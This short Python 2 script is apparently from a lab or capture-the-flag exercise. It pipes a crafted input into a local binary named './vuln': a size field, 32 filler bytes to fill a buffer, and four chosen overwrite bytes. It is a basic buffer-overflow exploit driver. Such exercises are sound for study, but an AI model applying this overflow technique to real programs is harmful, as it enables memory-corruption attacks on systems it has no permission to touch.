import subprocess

def call(sz, a, b, c, d):
  payload = ""
  payload += "%i\n" % sz # size of our input
  payload += "A" * 32 # To fill the buf buffer
  payload += chr(a) + chr(b) + chr(c) + chr(d) + '\n'

  p = subprocess.Popen(["./vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE) 
  (stdout, stderror) = p.communicate(payload)

  print stdout

call(33, 0, 0, 0, 0)
